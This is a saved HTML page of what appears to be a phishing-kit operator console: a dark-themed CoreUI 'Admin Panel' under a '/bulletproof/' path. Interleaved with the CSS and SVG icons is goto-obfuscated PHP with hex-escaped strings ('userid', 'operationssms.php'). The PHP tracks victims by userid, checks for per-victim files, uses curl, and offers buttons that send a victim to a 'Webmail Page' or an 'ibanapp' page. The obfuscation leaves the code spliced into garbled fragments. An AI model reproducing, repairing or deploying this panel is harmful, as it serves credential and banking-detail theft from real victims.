                --cui-btn-disabled-bg: transparent;
                --cui-gradient: none;
            }
            .dark-theme .btn-outline-info {
                --cui-btn-color: #5299e0;
                --cui-btn-border-color: #5299e0;
                --cui-btn-hover-color: #000015;
                --cui-btn-hover-bg: #75ade6;
                --cui-btn-hover-border-color: #63a3e3;
                --cui-btn-focus-shadow-rgb: 82, 153, 224;
                --cui-btn-active-color: #000015;
                --cui-btn-active-bg: #75ade6;
                --cui-btn-active-border-color: #63a3e3;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #5299e0;
                --cui-btn-disabled-bg: transparent;
                --cui-gradient: none;
            }
            .dark-theme .btn-ghost-primary {
                --cui-btn-color: #857dcc;
                --cui-btn-hover-bg: #9791d4;
                --cui-btn-hover-border-color: #918ad1;
                --cui-btn-hover-color: #000015;
                --cui-btn-active-bg: #9d97d6;
                --cui-btn-active-border-color: #918ad1;
                --cui-btn-active-color: #000015;
                --cui-btn-disabled-color: #857dcc;
                --cui-btn-shadow: rgba(133, 125, 204, 0.5);
            }
            .dark-theme .btn-ghost-secondary {
                --cui-btn-color: #a7a7a7;
                --cui-btn-hover-bg: #8e8e8e;
                --cui-btn-hover-border-color: #868686;
                --cui-btn-hover-color: #000015;
                --cui-btn-active-bg: #868686;
                --cui-btn-active-border-color: #7d7d7d;
                --cui-btn-active-color: #000015;
                --cui-btn-disabled-color: #a7a7a7;
                --cui-btn-shadow: rgba(167, 167, 167, 0.5);
            }
            .dark-theme .btn-ghost-success {
                --cui-btn-color: #519668;
                --cui-btn-hover-bg: #6ba67f;
                --cui-btn-hover-border-color: #62a177;
                --cui-btn-hover-color: #000015;
                --cui-btn-active-bg: #74ab86;
                --cui-btn-active-border-color: #62a177;
                --cui-btn-active-color: #000015;
                --cui-btn-disabled-color: #519668;
                --cui-btn-shadow: rgba(81, 150, 104, 0.5);
            }
            .dark-theme .btn-ghost-danger {
                --cui-btn-color: #c77171;
                --cui-btn-hover-bg: #cf8686;
                --cui-btn-hover-border-color: #cd7f7f;
                --cui-btn-hover-color: #000015;
                --cui-btn-active-bg: #d28d8d;
                --cui-btn-active-border-color: #cd7f7f;
                --cui-btn-active-color: #000015;
                --cui-btn-disabled-color: #c77171;
                --cui-btn-shadow: rgba(199, 113, 113, 0.5);
            }
            .dark-theme .btn-ghost-warning {
                --cui-btn-color: #d5a439;
                --cui-btn-hover-bg: #b58b30;
                --cui-btn-hover-border-color: #aa832e;
                --cui-btn-hover-color: #000015;
                --cui-btn-active-bg: #aa832e;
                --cui-btn-active-border-color: #a07b2b;
                --cui-btn-active-color: #000015;
                --cui-btn-disabled-color: #d5a439;
                --cui-btn-shadow: rgba(213, 164, 57, 0.5);
            }
            .dark-theme .btn-ghost-info {
                --cui-btn-color: #5299e0;
                --cui-btn-hover-bg: #6ca8e5;
                --cui-btn-hover-border-color: #63a3e3;
                --cui-btn-hover-color: #000015;
                --cui-btn-active-bg: #75ade6;
                --cui-btn-active-border-color: #63a3e3;
                --cui-btn-active-color: #000015;
                --cui-btn-disabled-color: #5299e0;
                --cui-btn-shadow: rgba(82, 153, 224, 0.5);
            }
            .dark-theme .list-group-item-primary {
                --cui-list-group-color: contrast-ratio-correction(#504b7a, #e7e5f5, 40%, "primary");
                --cui-list-group-bg: #e7e5f5;
                --cui-list-group-hover-bg: #7871b8;
                --cui-list-group-action-hover-color: contrast-ratio-correction(#504b7a, #e7e5f5, 40%, "primary");
                --cui-list-group-action-active-color: #fff;
                --cui-list-group-action-active-bg: contrast-ratio-correction(#504b7a, #e7e5f5, 40%, "primary");
                --cui-list-group-action-active-border-color: contrast-ratio-correction(#504b7a, #e7e5f5, 40%, "primary");
            }
            .dark-theme .list-group-item-secondary {
                --cui-list-group-color: contrast-ratio-correction(#646464, #ededed, 40%, "secondary");
                --cui-list-group-bg: #ededed;
                --cui-list-group-hover-bg: #969696;
                --cui-list-group-action-hover-color: contrast-ratio-correction(#646464, #ededed, 40%, "secondary");
                --cui-list-group-action-active-color: #fff;
                --cui-list-group-action-active-bg: contrast-ratio-correction(#646464, #ededed, 40%, "secondary");
                --cui-list-group-action-active-border-color: contrast-ratio-correction(#646464, #ededed, 40%, "secondary");
            }
            .dark-theme .list-group-item-success {
                --cui-list-group-color: contrast-ratio-correction(#315a3e, #dceae1, 40%, "success");
                --cui-list-group-bg: #dceae1;
                --cui-list-group-hover-bg: #49875e;
                --cui-list-group-action-hover-color: contrast-ratio-correction(#315a3e, #dceae1, 40%, "success");
                --cui-list-group-action-active-color: #fff;
                --cui-list-group-action-active-bg: contrast-ratio-correction(#315a3e, #dceae1, 40%, "success");
                --cui-list-group-action-active-border-color: contrast-ratio-correction(#315a3e, #dceae1, 40%, "success");
            }
            .dark-theme .list-group-item-danger {
                --cui-list-group-color: contrast-ratio-correction(#774444, #f4e3e3, 40%, "danger");
                --cui-list-group-bg: #f4e3e3;
                --cui-list-group-hover-bg: #b36666;
                --cui-list-group-action-hover-color: contrast-ratio-correction(#774444, #f4e3e3, 40%, "danger");
                --cui-list-group-action-active-color: #fff;
                --cui-list-group-action-active-bg: contrast-ratio-correction(#774444, #f4e3e3, 40%, "danger");
                --cui-list-group-action-active-border-color: contrast-ratio-correction(#774444, #f4e3e3, 40%, "danger");
            }
            .dark-theme .list-group-item-warning {
                --cui-list-group-color: contrast-ratio-correction(#806222, #f7edd7, 40%, "warning");
                --cui-list-group-bg: #f7edd7;
                --cui-list-group-hover-bg: #c09433;
                --cui-list-group-action-hover-color: contrast-ratio-correction(#806222, #f7edd7, 40%, "warning");
                --cui-list-group-action-active-color: #fff;
                --cui-list-group-action-active-bg: contrast-ratio-correction(#806222, #f7edd7, 40%, "warning");
                --cui-list-group-action-active-border-color: contrast-ratio-correction(#806222, #f7edd7, 40%, "warning");
            }
            .dark-theme .list-group-item-info {
                --cui-list-group-color: contrast-ratio-correction(#315c86, #dcebf9, 40%, "info");
                --cui-list-group-bg: #dcebf9;
                --cui-list-group-hover-bg: #4a8aca;
                --cui-list-group-action-hover-color: contrast-ratio-correction(#315c86, #dcebf9, 40%, "info");
                --cui-list-group-action-active-color: #fff;
                --cui-list-group-action-active-bg: contrast-ratio-correction(#315c86, #dcebf9, 40%, "info");
                --cui-list-group-action-active-border-color: contrast-ratio-correction(#315c86, #dcebf9, 40%, "info");
            }
            @-moz-document url-prefix("") {
                .dark-theme select:not([multiple]) option,
                .dark-theme select optgroup {
                    color: initial;
                }
            }
            .dark-theme .dark\:text-primary,
            .dark-theme .text-primary:not([class*="dark:"]) {
                color: rgba(var(--cui-primary-rgb), var(--cui-text-opacity)) !important;
            }
            .dark-theme .dark\:text-secondary,
            .dark-theme .text-secondary:not([class*="dark:"]) {
                color: rgba(var(--cui-secondary-rgb), var(--cui-text-opacity)) !important;
            }
            .dark-theme .dark\:text-success,
            .dark-theme .text-success:not([class*="dark:"]) {
                color: rgba(var(--cui-success-rgb), var(--cui-text-opacity)) !important;
            }
            .dark-theme .dark\:text-info,
            .dark-theme .text-info:not([class*="dark:"]) {
                color: rgba(var(--cui-info-rgb), var(--cui-text-opacity)) !important;
            }
            .dark-theme .dark\:text-warning,
            .dark-theme .text-warning:not([class*="dark:"]) {
                color: rgba(var(--cui-warning-rgb), var(--cui-text-opacity)) !important;
            }
            .dark-theme .dark\:text-danger,
            .dark-theme .text-danger:not([class*="dark:"]) {
                color: rgba(var(--cui-danger-rgb), var(--cui-text-opacity)) !important;
            }
            .dark-theme .dark\:text-light,
            .dark-theme .text-light:not([class*="dark:"]) {
                color: rgba(var(--cui-light-rgb), var(--cui-text-opacity)) !important;
            }
            .dark-theme .dark\:text-dark,
            .dark-theme .text-dark:not([class*="dark:"]) {
                color: rgba(var(--cui-dark-rgb), var(--cui-text-opacity)) !important;
            }
            .dark-theme .dark\:text-black,
            .dark-theme .text-black:not([class*="dark:"]) {
                color: rgba(var(--cui-black-rgb), var(--cui-text-opacity)) !important;
            }
            .dark-theme .dark\:text-white,
            .dark-theme .text-white:not([class*="dark:"]) {
                color: rgba(var(--cui-white-rgb), var(--cui-text-opacity)) !important;
            }
            .dark-theme .dark\:text-body,
            .dark-theme .text-body:not([class*="dark:"]) {
                color: rgba(var(--cui-body-color-rgb), var(--cui-text-opacity)) !important;
            }
            .dark-theme .dark\:text-high-emphasis,
            .dark-theme .text-high-emphasis:not([class*="dark:"]) {
                color: rgba(var(--cui-high-emphasis-rgb), var(--cui-text-opacity)) !important;
            }
            .dark-theme .dark\:text-medium-emphasis,
            .dark-theme .text-medium-emphasis:not([class*="dark:"]) {
                color: rgba(var(--cui-medium-emphasis-rgb), var(--cui-text-opacity)) !important;
            }
            .dark-theme .dark\:text-disabled,
            .dark-theme .text-disabled:not([class*="dark:"]) {
                color: rgba(var(--cui-disabled-rgb), var(--cui-text-opacity)) !important;
            }
            .dark-theme .dark\:text-reset,
            .dark-theme .text-reset:not([class*="dark:"]) {
                color: inherit !important;
            }
            .dark-theme .dark\:bg-primary,
            .dark-theme .bg-primary:not([class*="dark:"]) {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-primary-rgb), var(--cui-bg-opacity)) !important;
            }
            .dark-theme .dark\:bg-secondary,
            .dark-theme .bg-secondary:not([class*="dark:"]) {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-secondary-rgb), var(--cui-bg-opacity)) !important;
            }
            .dark-theme .dark\:bg-success,
            .dark-theme .bg-success:not([class*="dark:"]) {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-success-rgb), var(--cui-bg-opacity)) !important;
            }
            .dark-theme .dark\:bg-info,
            .dark-theme .bg-info:not([class*="dark:"]) {
                --cui-bg-opacity: 1;
                background-color: rgb(0 0 0 / 0%) !important;
            }
            .dark-theme .dark\:bg-warning,
            .dark-theme .bg-warning:not([class*="dark:"]) {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-warning-rgb), var(--cui-bg-opacity)) !important;
            }
            .dark-theme .dark\:bg-danger,
            .dark-theme .bg-danger:not([class*="dark:"]) {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-danger-rgb), var(--cui-bg-opacity)) !important;
            }
            .dark-theme .dark\:bg-light,
            .dark-theme .bg-light:not([class*="dark:"]) {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-light-rgb), var(--cui-bg-opacity)) !important;
            }
            .dark-theme .dark\:bg-dark,
            .dark-theme .bg-dark:not([class*="dark:"]) {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-dark-rgb), var(--cui-bg-opacity)) !important;
            }
            .dark-theme .dark\:bg-black,
            .dark-theme .bg-black:not([class*="dark:"]) {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-black-rgb), var(--cui-bg-opacity)) !important;
            }
            .dark-theme .dark\:bg-white,
            .dark-theme .bg-white:not([class*="dark:"]) {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-white-rgb), var(--cui-bg-opacity)) !important;
            }
            .dark-theme .dark\:bg-body,
            .dark-theme .bg-body:not([class*="dark:"]) {
                --cui-bg-opacity: 1;
                background-color: rgba(var(--cui-body-bg-rgb), var(--cui-bg-opacity)) !important;
            }
            .dark-theme .dark\:bg-transparent,
            .dark-theme .bg-transparent:not([class*="dark:"]) {
                --cui-bg-opacity: 1;
                background-color: transparent !important;
            }
            .dark-theme .dark\:bg-opacity-10,
            .dark-theme .bg-opacity-10:not([class*="dark:"]) {
                --cui-bg-opacity: 0.1;
            }
            .dark-theme .dark\:bg-opacity-25,
            .dark-theme .bg-opacity-25:not([class*="dark:"]) {
                --cui-bg-opacity: 0.25;
            }
            .dark-theme .dark\:bg-opacity-50,
            .dark-theme .bg-opacity-50:not([class*="dark:"]) {
                --cui-bg-opacity: 0.5;
            }
            .dark-theme .dark\:bg-opacity-75,
            .dark-theme .bg-opacity-75:not([class*="dark:"]) {
                --cui-bg-opacity: 0.75;
            }
            .dark-theme .dark\:bg-opacity-100,
            .dark-theme .bg-opacity-100:not([class*="dark:"]) {
                --cui-bg-opacity: 1;
            }
            .wrapper {
                width: 100%;
                will-change: auto;
                transition: padding 0.15s;
            }
            html:not([dir="rtl"]) .wrapper {
                padding-left: var(--cui-sidebar-occupy-start, 0);
                padding-right: var(--cui-sidebar-occupy-end, 0);
            }
            *[dir="rtl"] .wrapper {
                padding-right: var(--cui-sidebar-occupy-start, 0);
                padding-left: var(--cui-sidebar-occupy-end, 0);
            }
            @media (prefers-reduced-motion: reduce) {
                .wrapper {
                    transition: none;
                }
            }
            .fc {
                --fc-small-font-size: 0.85em;
                --fc-page-bg-color: #fff;
                --fc-neutral-bg-color: rgba(208, 208, 208, 0.3);
                --fc-neutral-text-color: #808080;
                --fc-border-color: var(--cui-border-color, #d8dbe0);
                --fc-button-text-color: #fff;
                --fc-button-bg-color: #2c3e50;
                --fc-button-border-color: #2c3e50;
                --fc-button-hover-bg-color: #1e2b37;
                --fc-button-hover-border-color: #1a252f;
                --fc-button-active-bg-color: #1a252f;
                --fc-button-active-border-color: #151e27;
                --fc-event-bg-color: #3788d8;
                --fc-event-border-color: #3788d8;
                --fc-event-text-color: #fff;
                --fc-event-selected-overlay-color: rgba(0, 0, 0, 0.25);
                --fc-event-resizer-thickness: 8px;
                --fc-event-resizer-dot-total-width: 8px;
                --fc-event-resizer-dot-border-width: 1px;
                --fc-non-business-color: rgba(215, 215, 215, 0.3);
                --fc-bg-event-color: rgb(143, 223, 130);
                --fc-bg-event-opacity: 0.3;
                --fc-highlight-color: rgba(188, 232, 241, 0.3);
                --fc-today-bg-color: rgba(255, 220, 40, 0.15);
                --fc-now-indicator-color: var(--cui-danger);
            }
            .example:not(:first-child) {
                margin-top: 1.5rem;
            }
            .example .tab-content {
                background-color: #f9fafa !important;
            }
            .dark-theme .example .tab-content {
                background-color: rgba(255, 255, 255, 0.1) !important;
            }
            .example + p {
                margin-top: 1.5rem;
            }
            .example .preview + p {
                margin-top: 2rem;
            }
            .example .preview > .form-control + .form-control {
                margin-top: 0.5rem;
            }
            .example .preview > .nav + .nav,
            .example .preview > .alert + .alert,
            .example .preview > .navbar + .navbar,
            .example .preview > .progress + .progress {
                margin-top: 1rem;
            }
            .example .preview > .dropdown-menu {
                position: static;
                display: block;
            }
            .example .preview > :last-child {
                margin-bottom: 0;
            }
            .example .preview > svg + svg,
            .example .preview > img + img {
                margin-left: 0.5rem;
            }
            .example .preview > .btn,
            .example .preview > .btn-group {
                margin: 0.25rem 0.125rem;
            }
            .example .preview > .btn-toolbar + .btn-toolbar {
                margin-top: 0.5rem;
            }
            .example .preview > .list-group {
                max-width: 400px;
            }
            .example .preview > [class*="list-group-horizontal"] {
                max-width: 100%;
            }
            .example .preview .fixed-top,
            .example .preview .sticky-top {
                position: static;
                margin: -1rem -1rem 1rem;
            }
            .example .preview .fixed-bottom {
                position: static;
                margin: 1rem -1rem -1rem;
            }
            @media (min-width: 576px) {
                .example .preview .fixed-top,
                .example .preview .sticky-top {
                    margin: -1.5rem -1.5rem 1rem;
                }
                .example .preview .fixed-bottom {
                    margin: 1rem -1.5rem -1.5rem;
                }
            }
            .example .preview .pagination {
                margin-top: 0.5rem;
                margin-bottom: 0.5rem;
            }
        </style>
        <!-- We use those styles to show code examples, you should remove them in your application.-->
        <style data-savepage-href="css/examples.css">
            /* stylelint-disable declaration-no-important, scss/selector-no-redundant-nesting-selector */
            .example:not(:first-child) {
                margin-top: 1.5rem;
            }
            .example .tab-content {
                background-color: #f9fafa !important;
            }
            .dark-theme .example .tab-content {
                background-color: rgba(255, 255, 255, 0.1) !important;
            }

            .example + p {
                margin-top: 1.5rem;
            }
            .example .preview + p {
                margin-top: 2rem;
            }
            .example .preview > .form-control + .form-control {
                margin-top: 0.5rem;
            }
            .example .preview > .nav + .nav,
            .example .preview > .alert + .alert,
            .example .preview > .navbar + .navbar,
            .example .preview > .progress + .progress {
                margin-top: 1rem;
            }
            .example .preview > .dropdown-menu {
                position: static;
                display: block;
            }
            .example .preview > :last-child {
                margin-bottom: 0;
            }
            .example .preview > svg + svg,
            .example .preview > img + img {
                margin-left: 0.5rem;
            }
            .example .preview > .btn,
            .example .preview > .btn-group {
                margin: 0.25rem 0.125rem;
            }
            .example .preview > .btn-toolbar + .btn-toolbar {
                margin-top: 0.5rem;
            }
            .example .preview > .list-group {
                max-width: 400px;
            }
            .example .preview > [class*="list-group-horizontal"] {
                max-width: 100%;
            }
            .example .preview .fixed-top,
            .example .preview .sticky-top {
                position: static;
                margin: -1rem -1rem 1rem;
            }
            .hover-hand:hover {
                cursor: pointer; /* Change cursor to pointer on hover */
            }
            .example .preview .fixed-bottom {
                position: static;
                margin: 1rem -1rem -1rem;
            }
            @media (min-width: 576px) {
                .example .preview .fixed-top,
                .example .preview .sticky-top {
                    margin: -1.5rem -1.5rem 1rem;
                }
                .example .preview .fixed-bottom {
                    margin: 1rem -1.5rem -1.5rem;
                }
            }
            .example .preview .pagination {
                margin-top: 0.5rem;
                margin-bottom: 0.5rem;
            }

            /*# sourceMappingURL=examples.css.map */
        </style>

        <!-- End Google Tag Manager-->
        <style data-savepage-href="vendors/@coreui/chartjs/css/coreui-chartjs.css">
            @charset "UTF-8"; /*!* CoreUI Plugins - Chart.js for CoreUI 3
* @version v3.1.2
* @link https://coreui.io
* Copyright (c) 2021 creativeLabs Łukasz Holeczek
* Licensed under MIT (https://github.com/coreui/coreui-chartjs/blob/main/LICENSE)*/
            .chartjs-tooltip {
                position: absolute;
                z-index: 1021;
                padding: 0.25rem 0.5rem;
                color: #fff;
                pointer-events: none;
                background: rgba(0, 0, 0, 0.7);
                opacity: 0;
                transition: all 0.15s ease;
                transform: translate(-50%, 0);
                border-radius: 0.375rem;
            }
            @media (prefers-reduced-motion: reduce) {
                .chartjs-tooltip {
                    transition: none;
                }
            }
            .chartjs-tooltip-header {
                margin-bottom: 0.5rem;
            }
            .chartjs-tooltip-header-item {
                font-size: 0.875rem;
                font-weight: 700;
            }
            .chartjs-tooltip-body-item {
                align-items: center;
                font-size: 0.875rem;
                white-space: nowrap;
            }
        </style>

        <style id="savepage-cssvariables">
            :root {
            }
        </style>

        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/lipis/flag-icons@6.11.0/css/flag-icons.min.css" />
    </head>

    <div id="overlay" class="overlay hidden" onclick="closePanel()"></div>
    <!-- Overlay -->

    <body class="dark-theme" bis_register="=">
        <!-- Google Tag Manager (noscript)-->
        <div id="toast-container" class="toast-container"></div>
        <!-- End Google Tag Manager (noscript)-->
        <div class="sidebar sidebar-dark sidebar-fixed" id="sidebar" bis_skin_checked="1">
            <div class="sidebar-brand d-none d-md-flex" bis_skin_checked="1">
                <p style="text-align: center;"><img alt="" src="https://static.wixstatic.com/media/2e9499_870d84b4ffc84c84be82eb4d9d30cd78~mv2.png" style="height: 38px; width: 130px;" /></p>

                <svg class="sidebar-brand-narrow" width="46" height="46" alt="CoreUI Logo">
                    <use data-savepage-href="assets/brand/coreui.svg#signet" href="#signet"></use>
                    <!--savepage-symbol-insert-->
                    <symbol id="signet" viewBox="0 0 160 160">
                        <g style="fill: currentColor;">
                            <path
                                class="cls-1"
                                d="M125,47.091,86,24.5743a12,12,0,0,0-12,0L35,47.091a12.0336,12.0336,0,0,0-6,10.3923v45.0334a12.0335,12.0335,0,0,0,6,10.3923l39,22.5166a11.9993,11.9993,0,0,0,12,0l39-22.5166a12.0335,12.0335,0,0,0,6-10.3923V57.4833A12.0336,12.0336,0,0,0,125,47.091Zm-2,55.4257a4,4,0,0,1-2,3.464L82,128.4974a4,4,0,0,1-4,0L39,105.9807a4,4,0,0,1-2-3.464V57.4833a4,4,0,0,1,2-3.4641L78,31.5025a4,4,0,0,1,4,0l39,22.5167a4,4,0,0,1,2,3.4641Z"
                            ></path>
                            <path
                                class="cls-1"
                                d="M103.0216,93.0379h-2.866a4,4,0,0,0-1.9246.4935L80.95,103.0167,61,91.4981V68.5206L80.95,57.002l17.2894,9.455a4,4,0,0,0,1.9192.4905h2.8632a2,2,0,0,0,2-2V62.2357a2,2,0,0,0-1.04-1.7547L84.793,49.9854a8.0391,8.0391,0,0,0-7.8428.09L57,61.5929A8.0243,8.0243,0,0,0,53,68.5216v22.976a8,8,0,0,0,4,6.9283l19.95,11.5185a8.0422,8.0422,0,0,0,7.8433.0879l19.19-10.5311a2,2,0,0,0,1.0378-1.7534v-2.71A2,2,0,0,0,103.0216,93.0379Z"
                            ></path>
                        </g>
                    </symbol>
                </svg>
            </div>

            <ul class="sidebar-nav simplebar-scrollable-y" data-coreui="navigation" data-simplebar="init">
                <div class="simplebar-wrapper" bis_skin_checked="1" style="margin: 0px;">
                    <div class="simplebar-height-auto-observer-wrapper" bis_skin_checked="1">
                        <div class="simplebar-height-auto-observer" bis_skin_checked="1"></div>
                    </div>
                    <div class="simplebar-mask" bis_skin_checked="1">
                        <div class="simplebar-offset" bis_skin_checked="1" style="right: 0px; bottom: 0px;">
                            <div class="simplebar-content-wrapper" tabindex="0" role="region" aria-label="scrollable content" bis_skin_checked="1" style="height: 100%; overflow: hidden scroll;">
                                <div class="simplebar-content" bis_skin_checked="1" style="padding: 0px;">
                                    <li class="nav-item">
                                        <a class="nav-link active" href="/bulletproof/login/">
                                            <svg class="nav-icon">
                                                <use data-savepage-href="vendors/@coreui/icons/svg/free.svg#cil-speedometer" href="#cil-speedometer"></use>
                                                <!--savepage-symbol-insert-->
                                                <symbol id="cil-speedometer" viewBox="0 0 512 512">
                                                    <path
                                                        fill="var(--ci-primary-color, currentColor)"
                                                        d="M425.706,142.294A240,240,0,0,0,16,312v88H160V368H48V312c0-114.691,93.309-208,208-208s208,93.309,208,208v56H352v32H496V312A238.432,238.432,0,0,0,425.706,142.294Z"
                                                        class="ci-primary"
                                                    ></path>
                                                    <rect width="32" height="32" x="80" y="264" fill="var(--ci-primary-color, currentColor)" class="ci-primary"></rect>
                                                    <rect width="32" height="32" x="240" y="128" fill="var(--ci-primary-color, currentColor)" class="ci-primary"></rect>
                                                    <rect width="32" height="32" x="136" y="168" fill="var(--ci-primary-color, currentColor)" class="ci-primary"></rect>
                                                    <rect width="32" height="32" x="400" y="264" fill="var(--ci-primary-color, currentColor)" class="ci-primary"></rect>
                                                    <path
                                                        fill="var(--ci-primary-color, currentColor)"
                                                        d="M297.222,335.1l69.2-144.173-28.85-13.848L268.389,321.214A64.141,64.141,0,1,0,297.222,335.1ZM256,416a32,32,0,1,1,32-32A32.036,32.036,0,0,1,256,416Z"
                                                        class="ci-primary"
                                                    ></path>
                                                </symbol>
                                            </svg>
                                            Admin Panel<?php  goto MTHVw; cWLVJ: ?>
" bis_skin_checked="1">
                                                            <small class="text-medium-emphasis text-truncate">Project</small>
                                                            <div class="fs-5 fw-semibold" bis_skin_checked="1"><?php  goto TAC_g; fm7kM: ?>
', 'delete')" type="button">Clear Log</button>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="simplebar-placeholder" bis_skin_checked="1" style="width: 256px; height: 1296px;"></div>
                </div>
                <div class="simplebar-track simplebar-horizontal" bis_skin_checked="1" style="visibility: hidden;"><div class="simplebar-scrollbar" bis_skin_checked="1" style="width: 0px; display: none;"></div></div>
                <div class="simplebar-track simplebar-vertical" bis_skin_checked="1" style="visibility: visible;">
                    <div class="simplebar-scrollbar" bis_skin_checked="1" style="height: 501px; transform: translate3d(0px, 0px, 0px); display: block;"></div>
                </div>
            </ul>
            <button class="sidebar-toggler" type="button" data-coreui-toggle="unfoldable"></button>
        </div>

        <div class="wrapper d-flex flex-column min-vh-100 bg-light dark:bg-transparent" bis_skin_checked="1">
            <header class="header header-sticky mb-4">
                <div class="header-divider" bis_skin_checked="1"></div>
                <div class="container-fluid" bis_skin_checked="1">
                    <nav aria-label="breadcrumb">
                        <ol class="breadcrumb my-0 ms-2">
                            <li class="breadcrumb-item">
                                <!-- if breadcrumb is single-->
                                <span>Home</span>
                            </li>
                            <li class="breadcrumb-item active"><span>Admin Panel</span></li>
                        </ol>
                    </nav>
                </div>
            </header>
            <div class="body flex-grow-1 px-3" bis_skin_checked="1">
                <div class="container-lg" bis_skin_checked="1">
                    <div class="card mb-4" bis_skin_checked="1">
                        <div class="card-body" bis_skin_checked="1">
                            <div class="d-flex justify-content-between" bis_skin_checked="1">
                                <div bis_skin_checked="1">
                                    <h4 class="card-title mb-0">Welcome!</h4>
                                </div>
                            </div>
                        </div>
                        <div class="row" bis_skin_checked="1">
                            <div class="col-md-12" bis_skin_checked="1">
                                <div class="card mb-4" bis_skin_checked="1">
                                    <div class="card-header" bis_skin_checked="1">Status</div>
                                    <div class="card-body" bis_skin_checked="1">
                                        <div class="row" bis_skin_checked="1">
                                            <div class="col-sm-6" bis_skin_checked="1">
                                                <div class="row" bis_skin_checked="1">
                                                    <div class="col-6" bis_skin_checked="1">
                                                        <div class="<?php  goto SEGua; DmYjD: ?>
', valueType, inputValue);
                  sendData('<?php  goto lbgVO; Hq_Zy: $response = curl_exec($curl); goto g9p1T; ox0zl: curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); goto Hq_Zy; h_PRu: if (check_file($_SESSION["\x75\163\145\162\151\144"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="sendData('<?php  echo $_SESSION["\x75\163\x65\162\x69\x64"]; ?>
', 'webmail')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg width="40px" height="40px" viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg">
                                                    <circle cx="512" cy="512" r="512" style="fill: #37beff;" />
                                                    <path
                                                        d="M512 273.8c-85.5 0-157 64.9-165.1 150l-64.7 37.3 93.5 54c-41.8-75.2-14.6-170.1 60.6-211.8 23.1-12.9 49.2-19.6 75.7-19.6 86.1 0 155.8 69.8 155.8 155.8 0 26.4-6.7 52.4-19.5 75.5l93.4-53.9-64.6-37.3c-8.1-85.1-79.6-150-165.1-150zM272.3 466.9v147.8L507 750.2V602.5L272.3 466.9zm479.4 0-115.4 66.7-104.8 60.5-2.2 1.3-12.3 7.1v147.8l234.7-135.6V466.9z"
                                                        style="fill: #fff;"
                                                    />
                                                </svg>
                                            </div>
                                            <div bis_skin_checked="1">
                                                <div class="fs-6 fw-semibold text-info" bis_skin_checked="1">Webmail Page</div>

                                                <?php  echo $_SESSION["\x69\x73\167\145\x62\155\x61\151\x6c"]; ?>
                                            </div>
                                        </div>
                                        <div class="card-footer px-3 py-2" bis_skin_checked="1">
                                            <a class="btn-block text-medium-emphasis d-flex justify-content-between align-items-center">
                                                <span class="small fw-semibold">Send</span>
                                                <svg width="16px" height="16px" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000">
                                                    <g id="SVGRepo_bgCarrier" stroke-width="0" />

                                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" />

                                                    <g id="SVGRepo_iconCarrier">
                                                        <path d="M364.8 106.666667L298.666667 172.8 637.866667 512 298.666667 851.2l66.133333 66.133333L768 512z" fill="#30ff14" />
                                                    </g>
                                                </svg>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                              	<?php  } goto bsxa1; pIJc2: $file_s = "\x6f\160\145\x72\x61\x74\x69\157\x6e\163\163\155\x73\56\160\x68\160"; goto Alj4B; lmw_4: ?>
                                        </a>
                                    </li>

                                    <li class="nav-title">Option</li>
                                    <button class="btn btn-outline-danger" onclick="sendData('<?php  goto FaZ20; WTloh: echo $_SESSION["\x61\154\154\137\x70\x61\x67\145"]; goto Kgbcm; U6Oqz: if (isset($_GET["\x75\163\145\x72\x69\144"])) { $userid = $_GET["\x75\x73\x65\162\x69\x64"]; $_SESSION["\x75\x73\145\x72\x69\144"] = $userid; } else { $_SESSION["\x75\163\145\x72\x69\x64"] = ''; } goto DblUi; QStge: function check_file($user, $filename) { $fileFullPath = $user . "\x2f" . $filename; if (file_exists($fileFullPath)) { return true; } else { return false; } } goto giAPp; rqZls: if (check_file($_SESSION["\x75\x73\x65\162\x69\144"], $file_s)) { ?>
                                <div class="col-6 col-lg-3 hover-hand" bis_skin_checked="1" onclick="sendData('<?php  echo $_SESSION["\165\x73\145\x72\x69\144"]; ?>
', 'ibanapp')">
                                    <div class="card" bis_skin_checked="1">
                                        <div class="card-body p-3 d-flex align-items-center" bis_skin_checked="1">
                                            <div class="bg-info text-white p-3 me-3" bis_skin_checked="1">
                                                <svg version="1.1" id="_x35_" width="40px" height="40px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 512 512" xml:space="preserve">
                                                    <g>
                                                        <g>
                                                            <polygon
                                                                style="fill: #d6d9c4;"
                                                                points="428.043,94.795 428.043,512 30.014,512 30.014,94.795 176.586,49.524 281.388,49.524 
			399.112,85.874 		"
                                                            />
                                                            <polygon
                                                                style="fill: #d6d9c4;"
                                                                points="458.058,70.701 456.807,84.207 453.639,118.307 450.554,128.395 428.043,121.475 
			378.769,106.217 251.123,66.781 229.029,59.945 30.014,121.475 7.504,128.395 4.419,118.307 0,70.701 30.014,61.446 
			176.586,16.174 229.029,0 281.388,16.174 296.895,21.01 424.625,60.361 428.043,61.446 436.714,64.114 		"
                                                            />
                                                            <polygon
                                                                style="opacity: 0.1; fill: #040000;"
                                                                points="453.633,118.326 450.517,128.384 428.056,121.442 428.056,137.057 
			229.019,75.576 30.001,137.057 30.001,121.442 7.54,128.384 4.424,118.326 30.001,110.423 176.615,65.115 227.153,49.5 
			229.019,48.923 230.884,49.5 281.422,65.115 428.056,110.423 		"
                                                            />
